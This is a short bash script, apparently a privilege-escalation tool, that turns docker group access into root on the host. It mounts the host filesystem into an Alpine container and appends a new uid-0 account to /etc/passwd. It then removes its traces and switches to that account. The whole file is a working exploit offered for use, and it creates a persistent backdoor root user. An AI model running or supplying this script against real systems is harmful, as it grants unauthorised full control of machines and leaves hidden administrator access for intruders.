#!/bin/bash

docker_test=$( docker ps | grep "CONTAINER ID" | cut -d " " -f 1-2 ) 

if [ $(id -u) -eq 0 ]; then
    echo "The user islready root. Have fun ;-)"
    exit
    
elif [ "$docker_test" == "CONTAINER ID" ]; then
    echo 'Please write down your new root credentials.'
    read -p 'Choose a root user name: ' rootname
    read -s -p 'Choose a root password: ' passw
    hpass=$(openssl passwd -1 -salt mysalt $passw)

    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
    mv new_account /tmp/new_account
    docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
    docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
    sleep 1; echo '...'
    
    echo 'Success! Root user ready. Enter your password to login as root:'
    docker rm -f flast101.github.io
    docker image rm alpine
    rm /tmp/new_account
    su $rootname

else echo "Your account does not have permission to execute docker or docker is not running, aborting..."
    exit

fi
